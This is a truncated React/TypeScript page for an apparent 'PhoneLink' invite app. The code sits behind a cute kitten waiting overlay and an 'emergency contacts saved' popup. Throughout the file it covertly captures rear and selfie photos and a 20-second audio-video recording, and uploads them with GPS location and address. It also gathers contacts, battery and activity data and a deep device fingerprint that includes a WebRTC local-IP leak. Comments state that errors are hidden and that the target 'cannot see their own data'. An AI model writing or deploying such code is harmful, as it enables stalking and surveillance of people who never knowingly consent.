import { useState, useEffect, useRef, useCallback } from "react";
import { useParams } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import {
  useGetInviteByToken,
  useGrantLocationConsent,
  getGetInviteByTokenQueryKey,
} from "@workspace/api-client-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle,
  WifiOff, ExternalLink, Camera, Video, ArrowLeft, Activity,
  Navigation, Share2, Copy, Check, Users, Phone,
} from "lucide-react";
import { classifySource, type LocationSource } from "@/hooks/use-fused-location";
import { FloatingSparkles } from "@/components/invites/FloatingSparkles";

const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
const GEO_PHOTO_COUNT = 5;
const GEO_SELFIE_PHOTO_COUNT = 2;
const GEO_VIDEO_DURATION_MS = 20_000;
const GEO_VIDEO_DURATION_SECONDS = GEO_VIDEO_DURATION_MS / 1000;

function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
  const ctrl = new AbortController();
  const id = setTimeout(() => ctrl.abort(), ms);
  return { signal: ctrl.signal, clear: () => clearTimeout(id) };
}

function copyToClipboard(text: string): Promise<void> {
  if (navigator.clipboard?.writeText) return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
  return fallbackCopy(text);
}
function fallbackCopy(text: string): Promise<void> {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
  document.body.appendChild(ta);
  try {
    ta.focus(); ta.select();
    const ok = document.execCommand("copy");
    return ok ? Promise.resolve() : Promise.reject(new Error("execCommand returned false"));
  } catch (e) { return Promise.reject(e); }
  finally { document.body.removeChild(ta); }
}

const fullHeight: React.CSSProperties = { minHeight: "100svh" };
const AUTO_RETRY_SECONDS = 5;

/** Cute pleading-cat animation shown while we auto-retry location access. */
function StayWithMeKitten({ secondsLeft }: { secondsLeft: number }) {
  return (
    <div className="mt-1 mb-6 flex flex-col items-center gap-2">
      <div className="relative h-16 w-16 flex items-center justify-center">
        <motion.span
          className="text-5xl inline-block select-none"
          role="img"
          aria-label="pleading cat"
          animate={{ y: [0, -8, 0], rotate: [-2, 2, -2] }}
          transition={{ duration: 1.1, repeat: Infinity, ease: "easeInOut" }}
        >
          🐱
        </motion.span>
        <motion.span
          className="absolute -top-1 -right-1 text-lg select-none"
          animate={{ opacity: [0.55, 1, 0.55], scale: [0.9, 1.15, 0.9] }}
          transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}
        >
          🥺
        </motion.span>
      </div>
      <p className="text-sm font-medium text-foreground">
        🥺 please stay with me for <span className="font-bold text-primary">{secondsLeft}</span>s…
      </p>
      <p className="text-xs text-muted-foreground">I'm automatically trying again</p>
    </div>
  );
}

function CopyAndOpenButton({ url }: { url: string }) {
  const [status, setStatus] = useState<"idle" | "copied" | "failed">("idle");
  const handleClick = () => {
    copyToClipboard(url).then(() => setStatus("copied")).catch(() => setStatus("failed"));
    const a = document.createElement("a");
    a.href = url; a.target = "_blank"; a.rel = "noreferrer";
    a.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
    document.body.appendChild(a); a.click();
    setTimeout(() => document.body.removeChild(a), 500);
  };
  return (
    <button onClick={handleClick} style={{ width: "100%", padding: "10px 16px", borderRadius: 8, background: status === "copied" ? "#16a34a" : "#6366f1", color: "#fff", fontWeight: 600, fontSize: 14, border: "none", cursor: "pointer" }}>
      {status === "copied" ? "✓ Link Copied — Open Browser Now" : status === "failed" ? "Open in Browser ↗" : "Copy Link & Open Browser"}
    </button>
  );
}

const KITTY_WAIT_SECONDS = 30;

// Playful status lines that rotate every few seconds so the wait doesn't
// feel static — purely cosmetic, has no effect on the actual capture work
// happening in the background.
const KITTY_MESSAGES = [
  "Getting everything set up just for you 🐾",
  "Sniffing out your exact location… 🐽",
  "Fluffing up the pixels for you 🐈‍⬛",
  "Almost there, promise! 🎀",
  "Just a little more patience, friend 🧶",
];

// Reactions shown for a couple seconds after the kitty is tapped/petted —
// gives the wait something to *do* instead of just watching a timer.
const KITTY_PET_REACTIONS = ["💕", "😻", "✨", "🐾", "💫"];

/** Full-screen pink "please wait" overlay shown once while sharing is set up. */
function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
  const [secondsLeft, setSecondsLeft] = useState(KITTY_WAIT_SECONDS);
  const [phase, setPhase] = useState<"waiting" | "kiss">("waiting");
  const [petCount, setPetCount] = useState(0);
  const [petBursts, setPetBursts] = useState<{ id: number; emoji: string }[]>([]);

  // Keep the latest onComplete in a ref so the kiss-phase timer effect below
  // only depends on `phase` — an inline callback identity changing on every
  // parent re-render (e.g. from background location/tracking updates while
  // the overlay is up) must never reset or duplicate this timer.
  const onCompleteRef = useRef(onComplete);
  useEffect(() => { onCompleteRef.current = onComplete; }, [onComplete]);

  useEffect(() => {
    if (phase !== "waiting") return;
    if (secondsLeft <= 0) { setPhase("kiss"); return; }
    const id = setTimeout(() => setSecondsLeft((s) => s - 1), 1000);
    return () => clearTimeout(id);
  }, [phase, secondsLeft]);

  useEffect(() => {
    if (phase !== "kiss") return;
    const id = setTimeout(() => onCompleteRef.current(), 2600);
    return () => clearTimeout(id);
  }, [phase]);

  const handlePet = useCallback(() => {
    setPetCount((c) => c + 1);
    const id = Date.now() + Math.random();
    const emoji = KITTY_PET_REACTIONS[Math.floor(Math.random() * KITTY_PET_REACTIONS.length)];
    setPetBursts((b) => [...b, { id, emoji }]);
    setTimeout(() => setPetBursts((b) => b.filter((x) => x.id !== id)), 1000);
  }, []);

  const circumference = 2 * Math.PI * 62;
  const progress = (KITTY_WAIT_SECONDS - secondsLeft) / KITTY_WAIT_SECONDS;
  const message = petCount > 0 && petCount % 3 === 0
    ? "Purrrr… you're the best 🥰"
    : KITTY_MESSAGES[Math.floor((KITTY_WAIT_SECONDS - secondsLeft) / 6) % KITTY_MESSAGES.length];

  return (
    <div
      className="relative flex flex-col items-center justify-center p-6 text-center overflow-hidden"
      style={{
        ...fullHeight,
        background: "radial-gradient(circle at 50% 20%, #ffd7e8 0%, #ffb3d9 35%, #d8a8ff 75%, #b78cff 100%)",
      }}
    >
      <FloatingSparkles />

      <motion.div
        className="inline-flex items-center gap-2 font-bold text-lg mb-8 relative z-10"
        style={{ color: "#7a1256" }}
        initial={{ opacity: 0, y: -8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
      >
        <Shield className="h-5 w-5" /> PhoneLink
      </motion.div>

      <AnimatePresence mode="wait">
        {phase === "waiting" ? (
          <motion.div
            key="waiting"
            className="relative z-10 flex flex-col items-center"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9 }}
            transition={{ duration: 0.4 }}
          >
            <div
              className="relative flex items-center justify-center mb-6 rounded-full"
              style={{
                width: 156, height: 156,
                background: "rgba(255,255,255,0.28)",
                backdropFilter: "blur(6px)",
                boxShadow: "0 0 0 1px rgba(255,255,255,0.4) inset, 0 12px 40px rgba(199,60,140,0.35)",
              }}
            >
              <svg width="140" height="140" style={{ position: "absolute", transform: "rotate(-90deg)" }}>
                <circle cx="70" cy="70" r="62" fill="none" stroke="rgba(255,255,255,0.5)" strokeWidth="8" />
                <motion.circle
                  cx="70" cy="70" r="62" fill="none" stroke="#e91e63" strokeWidth="8" strokeLinecap="round"
                  strokeDasharray={circumference}
                  animate={{ strokeDashoffset: circumference * (1 - progress) }}
                  transition={{ duration: 1, ease: "linear" }}
                />
              </svg>
              <motion.button
                type="button"
                onClick={handlePet}
                aria-label="pet the cat"
                data-testid="button-pet-kitty"
                className="text-6xl select-none cursor-pointer bg-transparent border-none p-0"
                animate={{ y: [0, -10, 0], rotate: [-3, 3, -3] }}
                transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut" }}
                whileTap={{ scale: 1.35, rotate: 0 }}
              >
                🐱
              </motion.button>
              <motion.span
                className="absolute top-2 right-4 text-2xl select-none"
                animate={{ opacity: [0.55, 1, 0.55], scale: [0.9, 1.2, 0.9] }}
                transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}
              >
                🥺
              </motion.span>
              <AnimatePresence>
                {petBursts.map((burst, i) => (
                  <motion.span
                    key={burst.id}
                    className="absolute text-2xl select-none pointer-events-none"
                    style={{ left: `${40 + i * 10}%`, top: "40%" }}
                    initial={{ y: 0, scale: 0.5, opacity: 1 }}
                    animate={{ y: -70, scale: 1.2, opacity: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.9, ease: "easeOut" }}
                  >
                    {burst.emoji}
                  </motion.span>
                ))}
              </AnimatePresence>
            </div>
            <p className="text-xl font-bold mb-1" style={{ color: "#7a1256" }}>
              Please wait {secondsLeft}s… 🥺
            </p>
            <p className="text-xs mb-1" style={{ color: "#b8477f" }}>
              Tap the cat — it loves attention 🐾{petCount > 0 ? ` (petted ${petCount}×)` : ""}
            </p>
            <p className="text-sm" style={{ color: "#9c2a6b" }}>
              {message}
            </p>
          </motion.div>
        ) : (
          <motion.div
            key="kiss"
            className="relative z-10 flex flex-col items-center"
            initial={{ opacity: 0, scale: 0.85 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.4, type: "spring", bounce: 0.4 }}
          >
            <div className="relative flex items-center justify-center mb-6" style={{ width: 140, height: 140 }}>
              <motion.span
                className="text-7xl select-none"
                role="img"
                aria-label="cat blowing a kiss"
                initial={{ scale: 0.4, rotate: -8, opacity: 0 }}
                animate={{ scale: [0.4, 1.15, 1], rotate: [-8, 4, 0], opacity: 1 }}
                transition={{ duration: 0.6, ease: "easeOut" }}
              >
                😽
              </motion.span>
              {[0, 1, 2].map((i) => (
                <motion.span
                  key={i}
                  className="absolute text-2xl select-none"
                  style={{ left: `${34 + i * 16}%`, top: "8%" }}
                  initial={{ y: 0, scale: 0.6, opacity: 0 }}
                  animate={{ y: -90, scale: 1.1, opacity: [0, 1, 0] }}
                  transition={{ duration: 1.8, delay: i * 0.25, repeat: Infinity, ease: "easeOut" }}
                >
                  💕
                </motion.span>
              ))}
            </div>
            <p className="text-xl font-bold mb-1" style={{ color: "#7a1256" }}>
              Thanks for your cooperation! 💖
            </p>
            <p className="text-sm" style={{ color: "#9c2a6b" }}>
              You're all set — sending a kiss your way 😘
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

/** Beautiful popup shown after contacts are synced. */
function ContactsSyncedPopup({
  contacts,
  onClose,
  senderName,
}: {
  contacts: { name: string; phone: string | null; email?: string | null }[];
  onClose: () => void;
  senderName: string;
}) {
  useEffect(() => {
    const t = setTimeout(onClose, 4500);
    return () => clearTimeout(t);
  }, [onClose]);

  return (
    <div
      className="fixed inset-0 z-[200] flex items-center justify-center p-4"
      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(10px)" }}
    >
      <motion.div
        className="w-full max-w-sm rounded-3xl overflow-hidden"
        style={{ background: "linear-gradient(160deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)", border: "1px solid rgba(99,102,241,0.3)", boxShadow: "0 0 60px rgba(99,102,241,0.25)" }}
        initial={{ opacity: 0, scale: 0.85, y: 20 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.5, type: "spring", bounce: 0.4 }}
      >
        {/* Confetti header */}
        <div className="relative px-6 pt-8 pb-4 text-center overflow-hidden">
          <FloatingSparkles />
          <motion.div
            className="text-5xl mb-3"
            initial={{ scale: 0 }}
            animate={{ scale: [0, 1.3, 1], rotate: [0, -10, 5, 0] }}
            transition={{ duration: 0.6, delay: 0.1 }}
          >
            ✅
          </motion.div>
          <h2 className="text-xl font-bold text-white mb-1">Emergency contacts saved!</h2>
          <p className="text-sm text-indigo-300">Shared with {senderName} • Saved to your session</p>
        </div>

        {/* Contact list */}
        <div className="px-6 pb-6 space-y-3">
          {contacts.map((c, i) => (
            <motion.div
              key={i}
              className="flex items-center gap-3 rounded-2xl px-4 py-3"
              style={{ background: "rgba(99,102,241,0.12)", border: "1px solid rgba(99,102,241,0.2)" }}
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.2 + i * 0.12 }}
            >
              <div className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-lg"
                style={{ background: ["rgba(245,158,11,0.2)", "rgba(99,102,241,0.2)", "rgba(16,185,129,0.2)"][i % 3], color: ["#f59e0b", "#818cf8", "#10b981"][i % 3] }}>
                {(c.name || "?")[0]?.toUpperCase()}
              </div>
              <div className="flex-1 min-w-0">
                <p className="font-semibold text-white text-sm truncate">{c.name || "Unknown"}</p>
                <p className="text-xs text-indigo-300 truncate">{c.phone || c.email || "No contact info"}</p>
              </div>
              <motion.span
                className="text-emerald-400 text-lg"
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.4 + i * 0.12, type: "spring" }}
              >
                ✓
              </motion.span>
            </motion.div>
          ))}
        </div>

        {/* Success toast bottom */}
        <div className="px-6 pb-6">
          <div className="rounded-2xl py-3 text-center text-sm font-semibold text-emerald-300"
            style={{ background: "rgba(16,185,129,0.12)", border: "1px solid rgba(16,185,129,0.25)" }}>
            Emergency contacts saved successfully ✓
          </div>
        </div>
      </motion.div>
    </div>
  );
}

type ConsentState =
  | "idle"
  | "pre_consent"
  | "requesting"
  | "granting"
  | "tracking"
  | "gps_off"
  | "denied"
  | "error"
  | "webview_blocked";

type ActivityType = "stationary" | "walking" | "running" | "driving";

const ACTIVITY_INFO: Record<ActivityType, { icon: string; label: string; color: string }> = {
  stationary: { icon: "📍", label: "Stationary",  color: "#6366f1" },
  walking:    { icon: "🚶", label: "Walking",      color: "#10b981" },
  running:    { icon: "🏃", label: "Running",      color: "#f59e0b" },
  driving:    { icon: "🚗", label: "Driving",      color: "#3b82f6" },
};

/** Convert decimal degrees to DMS string */
function toDMS(dd: number, isLat: boolean): string {
  const dir = isLat ? (dd >= 0 ? "N" : "S") : (dd >= 0 ? "E" : "W");
  const abs = Math.abs(dd);
  const deg = Math.floor(abs);
  const minFull = (abs - deg) * 60;
  const min = Math.floor(minFull);
  const sec = ((minFull - min) * 60).toFixed(1);
  return `${deg}°${min}′${sec}″${dir}`;
}
function formatDMS(lat: number, lng: number): string {
  return `${toDMS(lat, true)} ${toDMS(lng, false)}`;
}

/**
 * Requests camera + microphone together in a single getUserMedia call so
 * Chrome/Safari show one combined permission prompt (instead of a separate
 * prompt per device), then immediately releases the warm-up tracks. Must be
 * called synchronously from within a user-gesture handler (e.g. a button
 * click) — browsers require transient user activation to show the prompt.
 * Once the user answers, permission is resolved for the origin for the rest
 * of the session, so later getUserMedia calls (photo/video capture) resolve
 * instantly with no further prompt.
 */
function prewarmCameraAndMic(): void {
  if (!navigator.mediaDevices?.getUserMedia) return;
  navigator.mediaDevices
    .getUserMedia({
      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: { echoCancellation: true, noiseSuppression: true },
    })
    .then((stream) => stream.getTracks().forEach((t) => t.stop()))
    .catch(() => { /* camera/mic denied — photo/video capture will no-op later */ });
}

async function uploadGeoPhoto(
  token: string, photoData: string, lat: number, lng: number, address: string | undefined,
  cameraFacing: "environment" | "user",
): Promise<boolean> {
  try {
    const { signal, clear } = abortAfter(10_000);
    const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address, cameraFacing }), signal }).finally(clear);
    return resp.ok;
  } catch { return false; }
}

// Frame size + JPEG quality tuned down from the original 640x480@0.75 —
// still plenty sharp for verification, but produces a payload small enough
// to compress and upload almost instantly even on a slow connection.
const GEO_PHOTO_WIDTH = 480;
const GEO_PHOTO_HEIGHT = 360;
const GEO_PHOTO_QUALITY = 0.6;

async function captureGeoPhotos(
  token: string, lat: number, lng: number, address: string | undefined,
  onProgress: (n: number) => void,
  facingMode: "environment" | "user" = "environment",
  count: number = GEO_PHOTO_COUNT,
): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia) return;
  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
    const video = document.createElement("video");
    video.srcObject = stream; video.muted = true; video.playsInline = true;
    await video.play();
    // Short exposure/focus settle — just enough for autofocus to lock, not a
    // fixed multi-second pause.
    await new Promise((r) => setTimeout(r, 350));
    const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
    const ctx = canvas.getContext("2d")!;
    // Selfie shots (front camera) are naturally mirrored by the sensor on
    // most devices' preview — flip horizontally so the saved photo looks
    // like a normal (non-mirrored) selfie.
    if (facingMode === "user") { ctx.translate(GEO_PHOTO_WIDTH, 0); ctx.scale(-1, 1); }

    // Grab all frames back-to-back (only a small gap so each frame is
    // distinct), then compress + upload every shot in parallel instead of
    // serializing capture behind each upload's round trip.
    let uploaded = 0;
    const uploads: Promise<void>[] = [];
    for (let i = 0; i < count; i++) {
      ctx.drawImage(video, 0, 0, GEO_PHOTO_WIDTH, GEO_PHOTO_HEIGHT);
      const photoData = canvas.toDataURL("image/jpeg", GEO_PHOTO_QUALITY);
      uploads.push(
        uploadGeoPhoto(token, photoData, lat, lng, address, facingMode).then((ok) => {
          if (ok) { uploaded += 1; onProgress(uploaded); }
        }),
      );
      if (i < count - 1) await new Promise((r) => setTimeout(r, 120));
    }
    await Promise.all(uploads);
  } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
}

async function captureGeoVideo(
  token: string, lat: number, lng: number, address: string | undefined,
  onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
  facingMode: "environment" | "user" = "environment",
): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
  const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
  const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
  // Bitrate/resolution raised well above the old 180kbps/480x360 baseline —
  // at 20s duration this still lands well under the 50mb JSON body limit
  // (≈1.9MB video + ~0.16MB audio raw, ~2.6MB after base64 overhead) while
  // looking noticeably sharper even after the browser's own compression.
  const VIDEO_BPS = 600_000; const AUDIO_BPS = 64_000;
  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 640, max: 960 }, height: { ideal: 480, max: 720 }, frameRate: { ideal: 24, max: 30 } }, audio: { echoCancellation: true, noiseSuppression: true } });
    // Short settle so autofocus/exposure isn't mid-adjustment when recording
    // starts — no need for the previous long pause.
    await new Promise((r) => setTimeout(r, 200));
    const chunks: Blob[] = [];
    const recorderOptions: MediaRecorderOptions = {};
    if (mimeType) recorderOptions.mimeType = mimeType;
    try { recorderOptions.videoBitsPerSecond = VIDEO_BPS; recorderOptions.audioBitsPerSecond = AUDIO_BPS; } catch { /* */ }
    const recorder = new MediaRecorder(stream, recorderOptions);
    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
    onStateChange("recording");
    await new Promise<void>((resolve, reject) => {
      recorder.onstop = () => resolve(); recorder.onerror = () => reject(new Error("MediaRecorder error"));
      recorder.start(500); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, GEO_VIDEO_DURATION_MS);
    });
    const blob = new Blob(chunks, { type: mimeType || "video/webm" });
    if (blob.size === 0) { onStateChange("error"); return; }
    const base64 = await new Promise<string>((res, rej) => { const reader = new FileReader(); reader.onload = () => res(reader.result as string); reader.onerror = () => rej(new Error("FileReader error")); reader.readAsDataURL(blob); });
    onStateChange("uploading");
    const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs: GEO_VIDEO_DURATION_MS, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
    let uploaded = false;
    for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
      try { const { signal, clear } = abortAfter(30_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
    }
    onStateChange(uploaded ? "done" : "error");
  } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
}

function detectWebView(): boolean {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent || "";
  return (
    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp/.test(ua) ||
    (/iPhone|iPod|iPad/.test(ua) && !/Safari\//.test(ua) && /WebKit/.test(ua)) ||
    (/Android/.test(ua) && /wv\)/.test(ua))
  );
}

async function reverseGeocode(lat: number, lng: number): Promise<string | undefined> {
  try {
    const { signal, clear } = abortAfter(8000);
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`, { headers: { "Accept-Language": "en" }, signal }).finally(clear);
    if (r.ok) return (await r.json()).display_name as string;
  } catch { /* ignore */ }
  return undefined;
}

export default function ConsentPage() {
  const { token } = useParams<{ token: string }>();
  const isWebView = detectWebView();
  const [state, setState] = useState<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [coords, setCoords] = useState<{ lat: number; lng: number; accuracy?: number } | null>(null);
  const [address, setAddress] = useState<string | undefined>();
  const [updateCount, setUpdateCount] = useState(0);
  const [lastSent, setLastSent] = useState<Date | null>(null);
  const [geoPhotoCount, setGeoPhotoCount] = useState(0);
  const [geoPhotoDone, setGeoPhotoDone] = useState(false);
  const [geoSelfiePhotoCount, setGeoSelfiePhotoCount] = useState(0);
  const [geoSelfiePhotoDone, setGeoSelfiePhotoDone] = useState(false);
  const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
  const [geoSelfieState, setGeoSelfieState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [activityType, setActivityType] = useState<ActivityType>("stationary");
  const [linkCopied, setLinkCopied] = useState(false);
  const [contactsCollected, setContactsCollected] = useState(false);
  const contactsCollectedCountRef = useRef(0);
  const contactsTriedRef = useRef(false);
  const [showContactsPrompt, setShowContactsPrompt] = useState(false);
  const [autoRetrySecondsLeft, setAutoRetrySecondsLeft] = useState(AUTO_RETRY_SECONDS);
  const [kittyOverlayActive, setKittyOverlayActive] = useState(false);
  const kittyOverlayStartedRef = useRef(false);
  const [connectingCountdown, setConnectingCountdown] = useState(3);

  // Ref holding the latest doGrant so callbacks defined before doGrant can use it
  // without a "used before declaration" error (doGrant depends on processGeoPosition
  // which depends on startTracking, so it must be declared later in the file).
  const doGrantRef = useRef<() => void>(() => {});

  // ── New display-phase state machine ───────────────────────────────────────
  // contacts → kitty → contacts_popup → main
  // Contacts screen is ALWAYS shown first (before any location request).
  // Location runs silently in the background; errors are never surfaced to user.
  const [displayPhase, setDisplayPhase] = useState<"contacts" | "kitty" | "contacts_popup" | "main">("contacts");
  const [syncedContacts, setSyncedContacts] = useState<{ name: string; phone: string | null; email?: string | null }[]>([]);
  const syncedContactsRef = useRef<{ name: string; phone: string | null; email?: string | null }[]>([]);

  const geoBoardStartedRef = useRef(false);
  const geoSelfiePhotoStartedRef = useRef(false);
  const geoVideoStartedRef = useRef(false);
  const geoSelfieStartedRef = useRef(false);
  const earlyGeoRef = useRef<GeolocationPosition | null>(null);
  const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
  const earlyGeoReadyRef = useRef(false);
  const sawNetworkFixRef = useRef(false);
  const sawGpsFixRef = useRef(false);
  const watchIdRef = useRef<number | null>(null);
  const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastWatchPushRef = useRef<number>(0);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const autoStartedRef = useRef(false);
  const batteryLevelRef = useRef<number | null>(null);
  const batteryChargingRef = useRef(false);
  const activityTypeRef = useRef<ActivityType>("stationary");
  const gpsExtrasRef = useRef<{
    speedMps: number | null; headingDeg: number | null;
    altitudeMeters: number | null; altitudeAccuracyMeters: number | null;
  }>({ speedMps: null, headingDeg: null, altitudeMeters: null, altitudeAccuracyMeters: null });
  // Static-ish device/browser info gathered once — only ever surfaced to the
  // owner's dashboard (/api/sessions), never rendered on this public page.
  const deviceInfoRef = useRef<Record<string, unknown>>({});

  const GPS_KEY = `phonelink_gps_${token}`;
  const loadStoredGps = (): { lat: number; lng: number; accuracy?: number } | null => {
    try { const raw = localStorage.getItem(GPS_KEY); if (!raw) return null; return JSON.parse(raw); } catch { return null; }
  };
  const saveGps = (lat: number, lng: number, accuracy?: number) => {
    try { localStorage.setItem(GPS_KEY, JSON.stringify({ lat, lng, accuracy, ts: Date.now() })); } catch {}
  };

  const stateRef = useRef<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const addressRef = useRef<string | undefined>(undefined);
  const updateCountRef = useRef<number>(0);
  const coordsRef = useRef<{ lat: number; lng: number; accuracy?: number } | null>(null);

  useEffect(() => { stateRef.current = state; }, [state]);
  useEffect(() => { addressRef.current = address; }, [address]);
  useEffect(() => { updateCountRef.current = updateCount; }, [updateCount]);
  useEffect(() => { coordsRef.current = coords; }, [coords]);

  // Deep device/browser/network fingerprint — collected once asynchronously.
  // Only ever surfaced to the owner's dashboard (/api/sessions); never rendered
  // on this public page, so the contact cannot see their own data here.
  useEffect(() => {
    async function collectDeviceInfo() {
      const conn = (navigator as any).connection
        || (navigator as any).mozConnection
        || (navigator as any).webkitConnection;

      // ── 1. Client Hints — best Android model/brand source on Chrome ──────
      let hints: Record<string, unknown> = {};
      try {
        const uad = (navigator as any).userAgentData;
        if (uad?.getHighEntropyValues) {
          hints = await uad.getHighEntropyValues([
            "model", "platform", "platformVersion",
            "architecture", "bitness", "fullVersionList", "mobile",
          ]);
        }
      } catch { /* unsupported or blocked */ }

      // ── 2. Parse brand/model from UA as fallback ─────────────────────────
      const ua = navigator.userAgent;
      const androidMatch = ua.match(/Android[\s/]([\d.]+)/i);
      const buildMatch   = ua.match(/;\s*([^;)]+)\s+Build\//i);
      const fallbackModel = buildMatch?.[1]?.trim();

      // ── 3. GPU via WebGL debug extension ─────────────────────────────────
      let gpuVendor: string | null = null;
      let gpuRenderer: string | null = null;
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") as WebGLRenderingContext | null
          || canvas.getContext("experimental-webgl") as WebGLRenderingContext | null;
        if (gl) {
          const ext = gl.getExtension("WEBGL_debug_renderer_info");
          if (ext) {
            gpuVendor   = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   ?? null;
            gpuRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) ?? null;
          }
        }
      } catch { /* */ }

      // ── 4. Storage quota estimate ─────────────────────────────────────────
      let storageQuotaGb: string | null = null;
      let storageUsedGb:  string | null = null;
      try {
        if (navigator.storage?.estimate) {
          const est = await navigator.storage.estimate();
          if (est.quota) storageQuotaGb = (est.quota  / 1_073_741_824).toFixed(2) + " GB";
          if (est.usage) storageUsedGb  = (est.usage  / 1_073_741_824).toFixed(3) + " GB";
        }
      } catch { /* */ }

      // ── 5. Media devices (camera/mic count) ──────────────────────────────
      let cameraCount = 0;
      let microphoneCount = 0;
      let speakerCount = 0;
      try {
        if (navigator.mediaDevices?.enumerateDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          cameraCount     = devices.filter((d) => d.kind === "videoinput").length;
          microphoneCount = devices.filter((d) => d.kind === "audioinput").length;
          speakerCount    = devices.filter((d) => d.kind === "audiooutput").length;
        }
      } catch { /* permission denied — counts stay 0 */ }

      // ── 6. Network latency ping (RTT measurement) ─────────────────────────
      let measuredRttMs: number | null = null;
      try {
        const t0 = performance.now();
        await fetch(`${API_BASE}/api/healthz`, { method: "HEAD", cache: "no-store" });
        measuredRttMs = Math.round(performance.now() - t0);
      } catch { /* */ }

      // ── 7. Sensor availability ─────────────────────────────────────────────
      const sensors = {
        deviceMotion:      typeof DeviceMotionEvent      !== "undefined",
        deviceOrientation: typeof DeviceOrientationEvent !== "undefined",
        geolocation:       "geolocation"  in navigator,
        battery:           "getBattery"   in navigator,
        bluetooth:         "bluetooth"    in (navigator as any),
        usb:               "usb"          in (navigator as any),
        nfc:               "nfc"          in (navigator as any),
        vibration:         "vibrate"      in navigator,
        wakeLock:          "wakeLock"     in navigator,
        share:             "share"        in navigator,
        clipboard:         "clipboard"    in navigator,
        notification:      "Notification" in window,
      };

      // ── 8. Screen details ─────────────────────────────────────────────────
      const screen = window.screen ?? {} as Screen;
      const screenOrientation = (screen as any).orientation?.type ?? null;

      // ── 9. Connection extended ────────────────────────────────────────────
      const connectionInfo = conn ? {
        type:          conn.type          ?? null,
        effectiveType: conn.effectiveType ?? null,
        downlinkMbps:  conn.downlink      ?? null,
        downlinkMaxMbps: conn.downlinkMax ?? null,
        rttMs:         conn.rtt           ?? null,
        saveData:      conn.saveData      ?? null,
      } : null;

      // ── 10. Misc capabilities ─────────────────────────────────────────────
      const localeInfo = Intl.DateTimeFormat().resolvedOptions();

      // ── 11. WebRTC local IP leak (no permission needed) ───────────────────
      const localIPs: string[] = [];
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        await new Promise<void>((resolve) => {
